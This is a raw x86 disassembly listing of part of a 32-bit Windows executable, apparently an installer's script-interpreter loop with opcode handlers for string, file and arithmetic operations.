  4016a1:	89 0d c4 a0 40 00    	mov    %ecx,0x40a0c4
  4016a7:	8b 4d d8             	mov    -0x28(%ebp),%ecx
  4016aa:	83 c1 fe             	add    $0xfffffffe,%ecx
  4016ad:	83 f9 44             	cmp    $0x44,%ecx
  4016b0:	0f 87 62 16 00 00    	ja     0x402d18
  4016b6:	ff 24 8d 2c 2d 40 00 	jmp    *0x402d2c(,%ecx,4)
  4016bd:	6a 00                	push   $0x0
  4016bf:	50                   	push   %eax
  4016c0:	e8 cd 37 00 00       	call   0x404e92
  4016c5:	b8 ff ff ff 7f       	mov    $0x7fffffff,%eax
  4016ca:	e9 54 16 00 00       	jmp    0x402d23
  4016cf:	ff 05 94 c5 46 00    	incl   0x46c594
  4016d5:	83 7d f8 00          	cmpl   $0x0,-0x8(%ebp)
  4016d9:	74 ea                	je     0x4016c5
  4016db:	6a 00                	push   $0x0
  4016dd:	ff 15 30 82 40 00    	call   *0x408230
  4016e3:	eb e0                	jmp    0x4016c5
  4016e5:	50                   	push   %eax
  4016e6:	e8 91 fc ff ff       	call   0x40137c
  4016eb:	48                   	dec    %eax
  4016ec:	6a 00                	push   $0x0
  4016ee:	50                   	push   %eax
  4016ef:	e8 a7 fc ff ff       	call   0x40139b
  4016f4:	e9 2a 16 00 00       	jmp    0x402d23
  4016f9:	6a 00                	push   $0x0
  4016fb:	50                   	push   %eax
  4016fc:	e8 91 37 00 00       	call   0x404e92
  401701:	e9 12 16 00 00       	jmp    0x402d18
  401706:	33 c9                	xor    %ecx,%ecx
  401708:	e8 f9 fd ff ff       	call   0x401506
  40170d:	83 f8 01             	cmp    $0x1,%eax
  401710:	7f 03                	jg     0x401715
  401712:	33 c0                	xor    %eax,%eax
  401714:	40                   	inc    %eax
  401715:	50                   	push   %eax
  401716:	ff 15 8c 80 40 00    	call   *0x40808c
  40171c:	e9 f7 15 00 00       	jmp    0x402d18
  401721:	ff 75 f8             	push   -0x8(%ebp)
  401724:	ff 15 34 82 40 00    	call   *0x408234
  40172a:	e9 e9 15 00 00       	jmp    0x402d18
  40172f:	c1 e0 02             	shl    $0x2,%eax
  401732:	83 7d e4 00          	cmpl   $0x0,-0x1c(%ebp)
  401736:	75 23                	jne    0x40175b
  401738:	8b 88 80 46 47 00    	mov    0x474680(%eax),%ecx
  40173e:	89 88 40 46 47 00    	mov    %ecx,0x474640(%eax)
  401744:	33 c9                	xor    %ecx,%ecx
  401746:	41                   	inc    %ecx
  401747:	e8 ba fd ff ff       	call   0x401506
  40174c:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  40174f:	89 04 8d 80 46 47 00 	mov    %eax,0x474680(,%ecx,4)
  401756:	e9 bd 15 00 00       	jmp    0x402d18
  40175b:	8b 88 40 46 47 00    	mov    0x474640(%eax),%ecx
  401761:	89 88 80 46 47 00    	mov    %ecx,0x474680(%eax)
  401767:	e9 ac 15 00 00       	jmp    0x402d18
  40176c:	8b 55 e4             	mov    -0x1c(%ebp),%edx
  40176f:	8d 14 95 80 46 47 00 	lea    0x474680(,%edx,4),%edx
  401776:	8b 0a                	mov    (%edx),%ecx
  401778:	33 c0                	xor    %eax,%eax
  40177a:	85 c9                	test   %ecx,%ecx
  40177c:	0f 94 c0             	sete   %al
  40177f:	23 4d e8             	and    -0x18(%ebp),%ecx
  401782:	89 0a                	mov    %ecx,(%edx)
  401784:	8b 44 85 dc          	mov    -0x24(%ebp,%eax,4),%eax
  401788:	e9 96 15 00 00       	jmp    0x402d23
  40178d:	ff 34 95 80 46 47 00 	push   0x474680(,%edx,4)
  401794:	e9 79 15 00 00       	jmp    0x402d12
  401799:	8b 0d a0 c5 46 00    	mov    0x46c5a0,%ecx
  40179f:	8b 35 38 82 40 00    	mov    0x408238,%esi
  4017a5:	85 c9                	test   %ecx,%ecx
  4017a7:	74 07                	je     0x4017b0
  4017a9:	52                   	push   %edx
  4017aa:	51                   	push   %ecx
  4017ab:	ff d6                	call   *%esi
  4017ad:	8b 45 dc             	mov    -0x24(%ebp),%eax
  4017b0:	8b 0d 8c c5 46 00    	mov    0x46c58c,%ecx
  4017b6:	85 c9                	test   %ecx,%ecx
  4017b8:	0f 84 5a 15 00 00    	je     0x402d18
  4017be:	50                   	push   %eax
  4017bf:	51                   	push   %ecx
  4017c0:	ff d6                	call   *%esi
  4017c2:	e9 51 15 00 00       	jmp    0x402d18
  4017c7:	6a f0                	push   $0xfffffff0
  4017c9:	5e                   	pop    %esi
  4017ca:	e8 4d fd ff ff       	call   0x40151c
  4017cf:	ff 75 e0             	push   -0x20(%ebp)
  4017d2:	50                   	push   %eax
  4017d3:	ff 15 88 80 40 00    	call   *0x408088
  4017d9:	85 c0                	test   %eax,%eax
  4017db:	0f 85 37 15 00 00    	jne    0x402d18
  4017e1:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  4017e8:	e9 2b 15 00 00       	jmp    0x402d18
  4017ed:	6a f0                	push   $0xfffffff0
  4017ef:	5e                   	pop    %esi
  4017f0:	e8 27 fd ff ff       	call   0x40151c
  4017f5:	8b d8                	mov    %eax,%ebx
  4017f7:	53                   	push   %ebx
  4017f8:	e8 c3 44 00 00       	call   0x405cc0
  4017fd:	8b f0                	mov    %eax,%esi
  4017ff:	85 f6                	test   %esi,%esi
  401801:	74 43                	je     0x401846
  401803:	6a 5c                	push   $0x5c
  401805:	56                   	push   %esi
  401806:	e8 61 44 00 00       	call   0x405c6c
  40180b:	8b f0                	mov    %eax,%esi
  40180d:	0f b7 3e             	movzwl (%esi),%edi
  401810:	33 c0                	xor    %eax,%eax
  401812:	50                   	push   %eax
  401813:	53                   	push   %ebx
  401814:	66 89 06             	mov    %ax,(%esi)
  401817:	ff 15 84 80 40 00    	call   *0x408084
  40181d:	85 c0                	test   %eax,%eax
  40181f:	75 1b                	jne    0x40183c
  401821:	ff 15 80 80 40 00    	call   *0x408080
  401827:	3d b7 00 00 00       	cmp    $0xb7,%eax
  40182c:	75 0b                	jne    0x401839
  40182e:	53                   	push   %ebx
  40182f:	ff 15 7c 80 40 00    	call   *0x40807c
  401835:	a8 10                	test   $0x10,%al
  401837:	75 03                	jne    0x40183c
  401839:	ff 45 fc             	incl   -0x4(%ebp)
  40183c:	66 89 3e             	mov    %di,(%esi)
  40183f:	46                   	inc    %esi
  401840:	46                   	inc    %esi
  401841:	66 85 ff             	test   %di,%di
  401844:	75 bd                	jne    0x401803
  401846:	83 7d e0 00          	cmpl   $0x0,-0x20(%ebp)
  40184a:	74 1e                	je     0x40186a
  40184c:	6a e6                	push   $0xffffffe6
  40184e:	e8 a2 fc ff ff       	call   0x4014f5
  401853:	53                   	push   %ebx
  401854:	68 b0 d0 4c 00       	push   $0x4cd0b0
  401859:	e8 71 47 00 00       	call   0x405fcf
  40185e:	53                   	push   %ebx
  40185f:	ff 15 78 80 40 00    	call   *0x408078
  401865:	e9 ae 14 00 00       	jmp    0x402d18
  40186a:	6a f5                	push   $0xfffffff5
  40186c:	e8 84 fc ff ff       	call   0x4014f5
  401871:	e9 a2 14 00 00       	jmp    0x402d18
  401876:	33 f6                	xor    %esi,%esi
  401878:	e8 9f fc ff ff       	call   0x40151c
  40187d:	50                   	push   %eax
  40187e:	e8 9b 48 00 00       	call   0x40611e
  401883:	85 c0                	test   %eax,%eax
  401885:	0f 84 c5 03 00 00    	je     0x401c50
  40188b:	8b 45 e0             	mov    -0x20(%ebp),%eax
  40188e:	e9 90 14 00 00       	jmp    0x402d23
  401893:	6a d0                	push   $0xffffffd0
  401895:	5e                   	pop    %esi
  401896:	e8 81 fc ff ff       	call   0x40151c
  40189b:	6a df                	push   $0xffffffdf
  40189d:	5e                   	pop    %esi
  40189e:	8b f8                	mov    %eax,%edi
  4018a0:	e8 77 fc ff ff       	call   0x40151c
  4018a5:	6a 13                	push   $0x13
  4018a7:	5e                   	pop    %esi
  4018a8:	8b d8                	mov    %eax,%ebx
  4018aa:	e8 6d fc ff ff       	call   0x40151c
  4018af:	53                   	push   %ebx
  4018b0:	57                   	push   %edi
  4018b1:	ff 15 74 80 40 00    	call   *0x408074
  4018b7:	85 c0                	test   %eax,%eax
  4018b9:	74 04                	je     0x4018bf
  4018bb:	6a e3                	push   $0xffffffe3
  4018bd:	eb ad                	jmp    0x40186c
  4018bf:	83 7d e4 00          	cmpl   $0x0,-0x1c(%ebp)
  4018c3:	0f 84 18 ff ff ff    	je     0x4017e1
  4018c9:	57                   	push   %edi
  4018ca:	e8 4f 48 00 00       	call   0x40611e
  4018cf:	85 c0                	test   %eax,%eax
  4018d1:	0f 84 0a ff ff ff    	je     0x4017e1
  4018d7:	53                   	push   %ebx
  4018d8:	57                   	push   %edi
  4018d9:	e8 ce 51 00 00       	call   0x406aac
  4018de:	6a e4                	push   $0xffffffe4
  4018e0:	eb 8a                	jmp    0x40186c
  4018e2:	33 f6                	xor    %esi,%esi
  4018e4:	e8 33 fc ff ff       	call   0x40151c
  4018e9:	8b f0                	mov    %eax,%esi
  4018eb:	8d 45 08             	lea    0x8(%ebp),%eax
  4018ee:	50                   	push   %eax
  4018ef:	53                   	push   %ebx
  4018f0:	68 04 20 00 00       	push   $0x2004
  4018f5:	56                   	push   %esi
  4018f6:	ff 15 70 80 40 00    	call   *0x408070
  4018fc:	85 c0                	test   %eax,%eax
  4018fe:	74 25                	je     0x401925
  401900:	8b 45 08             	mov    0x8(%ebp),%eax
  401903:	3b c6                	cmp    %esi,%eax
  401905:	76 2a                	jbe    0x401931
  401907:	66 83 38 00          	cmpw   $0x0,(%eax)
  40190b:	74 24                	je     0x401931
  40190d:	56                   	push   %esi
  40190e:	e8 0b 48 00 00       	call   0x40611e
  401913:	85 c0                	test   %eax,%eax
  401915:	74 0e                	je     0x401925
  401917:	83 c0 2c             	add    $0x2c,%eax
  40191a:	50                   	push   %eax
  40191b:	ff 75 08             	push   0x8(%ebp)
  40191e:	e8 ac 46 00 00       	call   0x405fcf
  401923:	eb 0c                	jmp    0x401931
  401925:	33 c0                	xor    %eax,%eax
  401927:	66 89 03             	mov    %ax,(%ebx)
  40192a:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  401931:	83 7d e4 00          	cmpl   $0x0,-0x1c(%ebp)
  401935:	0f 85 dd 13 00 00    	jne    0x402d18
  40193b:	68 04 20 00 00       	push   $0x2004
  401940:	53                   	push   %ebx
  401941:	53                   	push   %ebx
  401942:	ff 15 6c 80 40 00    	call   *0x40806c
  401948:	e9 cb 13 00 00       	jmp    0x402d18
  40194d:	83 ce ff             	or     $0xffffffff,%esi
  401950:	e8 c7 fb ff ff       	call   0x40151c
  401955:	8d 4d 08             	lea    0x8(%ebp),%ecx
  401958:	51                   	push   %ecx
  401959:	57                   	push   %edi
  40195a:	68 04 20 00 00       	push   $0x2004
  40195f:	6a 00                	push   $0x0
  401961:	50                   	push   %eax
  401962:	6a 00                	push   $0x0
  401964:	ff 15 68 80 40 00    	call   *0x408068
  40196a:	85 c0                	test   %eax,%eax
  40196c:	0f 85 a6 13 00 00    	jne    0x402d18
  401972:	33 c0                	xor    %eax,%eax
  401974:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  40197b:	66 89 07             	mov    %ax,(%edi)
  40197e:	e9 95 13 00 00       	jmp    0x402d18
  401983:	6a ef                	push   $0xffffffef
  401985:	5e                   	pop    %esi
  401986:	e8 91 fb ff ff       	call   0x40151c
  40198b:	50                   	push   %eax
  40198c:	57                   	push   %edi
  40198d:	e8 b2 44 00 00       	call   0x405e44
  401992:	e9 42 fe ff ff       	jmp    0x4017d9
  401997:	6a 31                	push   $0x31
  401999:	5e                   	pop    %esi
  40199a:	e8 7d fb ff ff       	call   0x40151c
  40199f:	8b f0                	mov    %eax,%esi
  4019a1:	8b 45 dc             	mov    -0x24(%ebp),%eax
  4019a4:	83 e0 07             	and    $0x7,%eax
  4019a7:	56                   	push   %esi
  4019a8:	89 75 f4             	mov    %esi,-0xc(%ebp)
  4019ab:	89 45 08             	mov    %eax,0x8(%ebp)
  4019ae:	e8 d8 42 00 00       	call   0x405c8b
  4019b3:	56                   	push   %esi
  4019b4:	be c8 a0 40 00       	mov    $0x40a0c8,%esi
  4019b9:	85 c0                	test   %eax,%eax
  4019bb:	74 08                	je     0x4019c5
  4019bd:	56                   	push   %esi
  4019be:	e8 0c 46 00 00       	call   0x405fcf
  4019c3:	eb 17                	jmp    0x4019dc
  4019c5:	68 b0 d0 4c 00       	push   $0x4cd0b0
  4019ca:	56                   	push   %esi
  4019cb:	e8 ff 45 00 00       	call   0x405fcf
  4019d0:	50                   	push   %eax
  4019d1:	e8 96 4b 00 00       	call   0x40656c
  4019d6:	50                   	push   %eax
  4019d7:	e8 7e 46 00 00       	call   0x40605a
  4019dc:	56                   	push   %esi
  4019dd:	e8 8b 46 00 00       	call   0x40606d
  4019e2:	bf d8 20 41 00       	mov    $0x4120d8,%edi
  4019e7:	bb 00 50 47 00       	mov    $0x475000,%ebx
  4019ec:	83 7d 08 03          	cmpl   $0x3,0x8(%ebp)
  4019f0:	7c 31                	jl     0x401a23
  4019f2:	56                   	push   %esi
  4019f3:	e8 26 47 00 00       	call   0x40611e
  4019f8:	33 c9                	xor    %ecx,%ecx
  4019fa:	85 c0                	test   %eax,%eax
  4019fc:	74 10                	je     0x401a0e
  4019fe:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  401a01:	51                   	push   %ecx
  401a02:	83 c0 14             	add    $0x14,%eax
  401a05:	50                   	push   %eax
  401a06:	ff 15 64 80 40 00    	call   *0x408064
  401a0c:	8b c8                	mov    %eax,%ecx
  401a0e:	8b 45 08             	mov    0x8(%ebp),%eax
  401a11:	83 c0 fd             	add    $0xfffffffd,%eax
  401a14:	0d 00 00 00 80       	or     $0x80000000,%eax
  401a19:	23 c1                	and    %ecx,%eax
  401a1b:	f7 d8                	neg    %eax
  401a1d:	1b c0                	sbb    %eax,%eax
  401a1f:	40                   	inc    %eax
  401a20:	89 45 08             	mov    %eax,0x8(%ebp)
  401a23:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  401a27:	75 06                	jne    0x401a2f
  401a29:	56                   	push   %esi
  401a2a:	e8 c6 43 00 00       	call   0x405df5
  401a2f:	33 c0                	xor    %eax,%eax
  401a31:	83 7d 08 01          	cmpl   $0x1,0x8(%ebp)
  401a35:	0f 95 c0             	setne  %al
  401a38:	40                   	inc    %eax
  401a39:	50                   	push   %eax
  401a3a:	68 00 00 00 40       	push   $0x40000000
  401a3f:	56                   	push   %esi
  401a40:	e8 d0 43 00 00       	call   0x405e15
  401a45:	89 45 f8             	mov    %eax,-0x8(%ebp)
  401a48:	83 f8 ff             	cmp    $0xffffffff,%eax
  401a4b:	75 6b                	jne    0x401ab8
  401a4d:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  401a51:	75 47                	jne    0x401a9a
  401a53:	53                   	push   %ebx
  401a54:	57                   	push   %edi
  401a55:	e8 75 45 00 00       	call   0x405fcf
  401a5a:	56                   	push   %esi
  401a5b:	53                   	push   %ebx
  401a5c:	e8 6e 45 00 00       	call   0x405fcf
  401a61:	ff 75 f0             	push   -0x10(%ebp)
  401a64:	68 d0 e0 40 00       	push   $0x40e0d0
  401a69:	e8 e2 4b 00 00       	call   0x406650
  401a6e:	57                   	push   %edi
  401a6f:	53                   	push   %ebx
  401a70:	e8 5a 45 00 00       	call   0x405fcf
  401a75:	8b 45 dc             	mov    -0x24(%ebp),%eax
  401a78:	c1 f8 03             	sar    $0x3,%eax
  401a7b:	50                   	push   %eax
  401a7c:	68 d0 e0 40 00       	push   $0x40e0d0
  401a81:	e8 80 41 00 00       	call   0x405c06
  401a86:	83 e8 04             	sub    $0x4,%eax
  401a89:	0f 84 5d ff ff ff    	je     0x4019ec
  401a8f:	48                   	dec    %eax
  401a90:	74 1b                	je     0x401aad
  401a92:	56                   	push   %esi
  401a93:	6a fa                	push   $0xfffffffa
  401a95:	e9 26 fc ff ff       	jmp    0x4016c0
  401a9a:	ff 75 f4             	push   -0xc(%ebp)
  401a9d:	6a e2                	push   $0xffffffe2
  401a9f:	e8 ee 33 00 00       	call   0x404e92
  401aa4:	83 7d 08 02          	cmpl   $0x2,0x8(%ebp)
  401aa8:	e9 2e fd ff ff       	jmp    0x4017db
  401aad:	ff 05 88 46 47 00    	incl   0x474688
  401ab3:	e9 69 12 00 00       	jmp    0x402d21
  401ab8:	ff 75 f4             	push   -0xc(%ebp)
  401abb:	6a ea                	push   $0xffffffea
  401abd:	e8 d0 33 00 00       	call   0x404e92
  401ac2:	ff 05 b4 46 47 00    	incl   0x4746b4
  401ac8:	33 ff                	xor    %edi,%edi
  401aca:	57                   	push   %edi
  401acb:	57                   	push   %edi
  401acc:	ff 75 f8             	push   -0x8(%ebp)
  401acf:	ff 75 e4             	push   -0x1c(%ebp)
  401ad2:	e8 a1 16 00 00       	call   0x403178
  401ad7:	ff 0d b4 46 47 00    	decl   0x4746b4
  401add:	83 7d e8 ff          	cmpl   $0xffffffff,-0x18(%ebp)
  401ae1:	8b d8                	mov    %eax,%ebx
  401ae3:	75 06                	jne    0x401aeb
  401ae5:	83 7d ec ff          	cmpl   $0xffffffff,-0x14(%ebp)
  401ae9:	74 0f                	je     0x401afa
  401aeb:	8d 45 e8             	lea    -0x18(%ebp),%eax
  401aee:	50                   	push   %eax
  401aef:	57                   	push   %edi
  401af0:	50                   	push   %eax
  401af1:	ff 75 f8             	push   -0x8(%ebp)
  401af4:	ff 15 60 80 40 00    	call   *0x408060
  401afa:	ff 75 f8             	push   -0x8(%ebp)
  401afd:	ff 15 bc 80 40 00    	call   *0x4080bc
  401b03:	3b df                	cmp    %edi,%ebx
  401b05:	0f 8d 0d 12 00 00    	jge    0x402d18
  401b0b:	83 fb fe             	cmp    $0xfffffffe,%ebx
  401b0e:	75 13                	jne    0x401b23
  401b10:	6a e9                	push   $0xffffffe9
  401b12:	56                   	push   %esi
  401b13:	e8 38 4b 00 00       	call   0x406650
  401b18:	ff 75 f4             	push   -0xc(%ebp)
  401b1b:	56                   	push   %esi
  401b1c:	e8 39 45 00 00       	call   0x40605a
  401b21:	eb 08                	jmp    0x401b2b
  401b23:	6a ee                	push   $0xffffffee
  401b25:	56                   	push   %esi
  401b26:	e8 25 4b 00 00       	call   0x406650
  401b2b:	68 10 00 20 00       	push   $0x200010
  401b30:	56                   	push   %esi
  401b31:	e8 d0 40 00 00       	call   0x405c06
  401b36:	e9 8a fb ff ff       	jmp    0x4016c5
  401b3b:	33 f6                	xor    %esi,%esi
  401b3d:	e8 da f9 ff ff       	call   0x40151c
  401b42:	ff 75 e0             	push   -0x20(%ebp)
  401b45:	50                   	push   %eax
  401b46:	e8 94 4f 00 00       	call   0x406adf
  401b4b:	e9 c8 11 00 00       	jmp    0x402d18
  401b50:	6a 31                	push   $0x31
  401b52:	5e                   	pop    %esi
  401b53:	e8 c4 f9 ff ff       	call   0x40151c
  401b58:	ff 75 dc             	push   -0x24(%ebp)
  401b5b:	50                   	push   %eax
  401b5c:	e8 a5 40 00 00       	call   0x405c06
  401b61:	85 c0                	test   %eax,%eax
  401b63:	0f 84 78 fc ff ff    	je     0x4017e1
  401b69:	3b 45 e4             	cmp    -0x1c(%ebp),%eax
  401b6c:	75 08                	jne    0x401b76
  401b6e:	8b 45 e8             	mov    -0x18(%ebp),%eax
  401b71:	e9 ad 11 00 00       	jmp    0x402d23
  401b76:	3b 45 ec             	cmp    -0x14(%ebp),%eax
  401b79:	0f 85 99 11 00 00    	jne    0x402d18
  401b7f:	8b 45 f0             	mov    -0x10(%ebp),%eax
  401b82:	e9 9c 11 00 00       	jmp    0x402d23
  401b87:	6a f0                	push   $0xfffffff0
  401b89:	5e                   	pop    %esi
  401b8a:	eb b1                	jmp    0x401b3d
  401b8c:	33 f6                	xor    %esi,%esi
  401b8e:	46                   	inc    %esi
  401b8f:	e8 88 f9 ff ff       	call   0x40151c
  401b94:	50                   	push   %eax
  401b95:	e8 4b 44 00 00       	call   0x405fe5
  401b9a:	e9 72 11 00 00       	jmp    0x402d11
  401b9f:	6a 02                	push   $0x2
  401ba1:	59                   	pop    %ecx
  401ba2:	e8 5f f9 ff ff       	call   0x401506
  401ba7:	6a 03                	push   $0x3
  401ba9:	59                   	pop    %ecx
  401baa:	89 45 08             	mov    %eax,0x8(%ebp)
  401bad:	e8 54 f9 ff ff       	call   0x401506
  401bb2:	33 f6                	xor    %esi,%esi
  401bb4:	46                   	inc    %esi
  401bb5:	8b d8                	mov    %eax,%ebx
  401bb7:	e8 60 f9 ff ff       	call   0x40151c
  401bbc:	8b f0                	mov    %eax,%esi
  401bbe:	33 c0                	xor    %eax,%eax
  401bc0:	66 89 07             	mov    %ax,(%edi)
  401bc3:	39 45 e4             	cmp    %eax,-0x1c(%ebp)
  401bc6:	74 09                	je     0x401bd1
  401bc8:	39 45 08             	cmp    %eax,0x8(%ebp)
  401bcb:	0f 84 47 11 00 00    	je     0x402d18
  401bd1:	56                   	push   %esi
  401bd2:	e8 0e 44 00 00       	call   0x405fe5
  401bd7:	85 db                	test   %ebx,%ebx
  401bd9:	7d 08                	jge    0x401be3
  401bdb:	03 d8                	add    %eax,%ebx
  401bdd:	0f 88 35 11 00 00    	js     0x402d18
  401be3:	3b d8                	cmp    %eax,%ebx
  401be5:	7e 02                	jle    0x401be9
  401be7:	8b d8                	mov    %eax,%ebx
  401be9:	8d 04 5e             	lea    (%esi,%ebx,2),%eax
  401bec:	50                   	push   %eax
  401bed:	57                   	push   %edi
  401bee:	e8 dc 43 00 00       	call   0x405fcf
  401bf3:	8b 75 08             	mov    0x8(%ebp),%esi
  401bf6:	85 f6                	test   %esi,%esi
  401bf8:	0f 84 1a 11 00 00    	je     0x402d18
  401bfe:	7d 11                	jge    0x401c11
  401c00:	57                   	push   %edi
  401c01:	e8 df 43 00 00       	call   0x405fe5
  401c06:	03 f0                	add    %eax,%esi
  401c08:	79 07                	jns    0x401c11
  401c0a:	83 65 08 00          	andl   $0x0,0x8(%ebp)
  401c0e:	8b 75 08             	mov    0x8(%ebp),%esi
  401c11:	81 fe 04 20 00 00    	cmp    $0x2004,%esi
  401c17:	0f 8d fb 10 00 00    	jge    0x402d18
  401c1d:	33 c0                	xor    %eax,%eax
  401c1f:	66 89 04 77          	mov    %ax,(%edi,%esi,2)
  401c23:	e9 f0 10 00 00       	jmp    0x402d18
  401c28:	6a 20                	push   $0x20
  401c2a:	5e                   	pop    %esi
  401c2b:	e8 ec f8 ff ff       	call   0x40151c
  401c30:	6a 31                	push   $0x31
  401c32:	5e                   	pop    %esi
  401c33:	8b f8                	mov    %eax,%edi
  401c35:	e8 e2 f8 ff ff       	call   0x40151c
  401c3a:	83 7d ec 00          	cmpl   $0x0,-0x14(%ebp)
  401c3e:	50                   	push   %eax
  401c3f:	57                   	push   %edi
  401c40:	75 16                	jne    0x401c58
  401c42:	ff 15 18 81 40 00    	call   *0x408118
  401c48:	85 c0                	test   %eax,%eax
  401c4a:	0f 85 1e ff ff ff    	jne    0x401b6e
  401c50:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  401c53:	e9 cb 10 00 00       	jmp    0x402d23
  401c58:	ff 15 1c 81 40 00    	call   *0x40811c
  401c5e:	eb e8                	jmp    0x401c48
  401c60:	33 f6                	xor    %esi,%esi
  401c62:	46                   	inc    %esi
  401c63:	e8 b4 f8 ff ff       	call   0x40151c
  401c68:	68 04 20 00 00       	push   $0x2004
  401c6d:	8b d8                	mov    %eax,%ebx
  401c6f:	57                   	push   %edi
  401c70:	53                   	push   %ebx
  401c71:	ff 15 20 81 40 00    	call   *0x408120
  401c77:	85 c0                	test   %eax,%eax
  401c79:	74 12                	je     0x401c8d
  401c7b:	83 7d e4 00          	cmpl   $0x0,-0x1c(%ebp)
  401c7f:	74 14                	je     0x401c95
  401c81:	57                   	push   %edi
  401c82:	53                   	push   %ebx
  401c83:	ff 15 1c 81 40 00    	call   *0x40811c
  401c89:	85 c0                	test   %eax,%eax
  401c8b:	75 08                	jne    0x401c95
  401c8d:	33 c0                	xor    %eax,%eax
  401c8f:	89 75 fc             	mov    %esi,-0x4(%ebp)
  401c92:	66 89 07             	mov    %ax,(%edi)
  401c95:	33 c0                	xor    %eax,%eax
  401c97:	66 89 87 06 40 00 00 	mov    %ax,0x4006(%edi)
  401c9e:	e9 75 10 00 00       	jmp    0x402d18
  401ca3:	33 c9                	xor    %ecx,%ecx
  401ca5:	e8 5c f8 ff ff       	call   0x401506
  401caa:	33 c9                	xor    %ecx,%ecx
  401cac:	41                   	inc    %ecx
  401cad:	8b f0                	mov    %eax,%esi
  401caf:	e8 52 f8 ff ff       	call   0x401506
  401cb4:	83 7d f0 00          	cmpl   $0x0,-0x10(%ebp)
  401cb8:	75 12                	jne    0x401ccc
  401cba:	3b f0                	cmp    %eax,%esi
  401cbc:	0f 8c ac fe ff ff    	jl     0x401b6e
  401cc2:	7e 8c                	jle    0x401c50
  401cc4:	8b 45 ec             	mov    -0x14(%ebp),%eax
  401cc7:	e9 57 10 00 00       	jmp    0x402d23
  401ccc:	3b f0                	cmp    %eax,%esi
  401cce:	0f 82 9a fe ff ff    	jb     0x401b6e
  401cd4:	0f 86 76 ff ff ff    	jbe    0x401c50
  401cda:	eb e8                	jmp    0x401cc4
  401cdc:	33 db                	xor    %ebx,%ebx
  401cde:	43                   	inc    %ebx
  401cdf:	8b cb                	mov    %ebx,%ecx
  401ce1:	e8 20 f8 ff ff       	call   0x401506
  401ce6:	6a 02                	push   $0x2
  401ce8:	59                   	pop    %ecx
  401ce9:	8b f0                	mov    %eax,%esi
  401ceb:	e8 16 f8 ff ff       	call   0x401506
  401cf0:	8b c8                	mov    %eax,%ecx
  401cf2:	8b 45 e8             	mov    -0x18(%ebp),%eax
  401cf5:	83 f8 0c             	cmp    $0xc,%eax
  401cf8:	77 66                	ja     0x401d60
  401cfa:	ff 24 85 40 2e 40 00 	jmp    *0x402e40(,%eax,4)
  401d01:	03 f1                	add    %ecx,%esi
  401d03:	eb 5b                	jmp    0x401d60
  401d05:	2b f1                	sub    %ecx,%esi
  401d07:	eb 57                	jmp    0x401d60
  401d09:	0f af ce             	imul   %esi,%ecx
  401d0c:	8b f1                	mov    %ecx,%esi
  401d0e:	eb 50                	jmp    0x401d60
  401d10:	85 c9                	test   %ecx,%ecx
  401d12:	74 07                	je     0x401d1b
  401d14:	8b c6                	mov    %esi,%eax
  401d16:	99                   	cltd
  401d17:	f7 f9                	idiv   %ecx
  401d19:	eb 1a                	jmp    0x401d35
  401d1b:	33 f6                	xor    %esi,%esi
  401d1d:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  401d20:	eb 3e                	jmp    0x401d60
  401d22:	0b f1                	or     %ecx,%esi
  401d24:	eb 3a                	jmp    0x401d60
  401d26:	23 f1                	and    %ecx,%esi
  401d28:	eb 36                	jmp    0x401d60
  401d2a:	33 f1                	xor    %ecx,%esi
  401d2c:	eb 32                	jmp    0x401d60
  401d2e:	33 c0                	xor    %eax,%eax
  401d30:	85 f6                	test   %esi,%esi
  401d32:	0f 94 c0             	sete   %al
  401d35:	8b f0                	mov    %eax,%esi
  401d37:	eb 27                	jmp    0x401d60
  401d39:	85 f6                	test   %esi,%esi
  401d3b:	75 04                	jne    0x401d41
  401d3d:	85 c9                	test   %ecx,%ecx
  401d3f:	74 08                	je     0x401d49
  401d41:	8b f3                	mov    %ebx,%esi
  401d43:	eb 1b                	jmp    0x401d60
  401d45:	85 f6                	test   %esi,%esi
  401d47:	75 f4                	jne    0x401d3d
  401d49:	33 f6                	xor    %esi,%esi
  401d4b:	eb 13                	jmp    0x401d60
  401d4d:	85 c9                	test   %ecx,%ecx
  401d4f:	74 ca                	je     0x401d1b
  401d51:	8b c6                	mov    %esi,%eax
  401d53:	99                   	cltd
  401d54:	f7 f9                	idiv   %ecx
  401d56:	8b f2                	mov    %edx,%esi
  401d58:	eb 06                	jmp    0x401d60
  401d5a:	d3 e6                	shl    %cl,%esi
  401d5c:	eb 02                	jmp    0x401d60
  401d5e:	d3 fe                	sar    %cl,%esi
  401d60:	56                   	push   %esi
  401d61:	e9 ac 0f 00 00       	jmp    0x402d12
  401d66:	33 f6                	xor    %esi,%esi
  401d68:	46                   	inc    %esi
  401d69:	e8 ae f7 ff ff       	call   0x40151c
  401d6e:	6a 02                	push   $0x2
  401d70:	59                   	pop    %ecx
  401d71:	8b f0                	mov    %eax,%esi
  401d73:	e8 8e f7 ff ff       	call   0x401506
  401d78:	50                   	push   %eax
  401d79:	56                   	push   %esi
  401d7a:	57                   	push   %edi
  401d7b:	ff 15 3c 82 40 00    	call   *0x40823c
  401d81:	83 c4 0c             	add    $0xc,%esp
  401d84:	e9 8f 0f 00 00       	jmp    0x402d18
  401d89:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  401d8c:	8b 35 c0 a0 40 00    	mov    0x40a0c0,%esi
  401d92:	85 c0                	test   %eax,%eax
  401d94:	74 50                	je     0x401de6
  401d96:	48                   	dec    %eax
  401d97:	85 f6                	test   %esi,%esi
  401d99:	74 0a                	je     0x401da5
  401d9b:	8b 36                	mov    (%esi),%esi
  401d9d:	85 c0                	test   %eax,%eax
  401d9f:	75 f5                	jne    0x401d96
  401da1:	85 f6                	test   %esi,%esi
  401da3:	75 14                	jne    0x401db9
  401da5:	68 10 00 20 00       	push   $0x200010
  401daa:	6a e8                	push   $0xffffffe8
  401dac:	6a 00                	push   $0x0
  401dae:	e8 9d 48 00 00       	call   0x406650
  401db3:	50                   	push   %eax
  401db4:	e9 78 fd ff ff       	jmp    0x401b31
  401db9:	8d 7e 04             	lea    0x4(%esi),%edi
  401dbc:	57                   	push   %edi
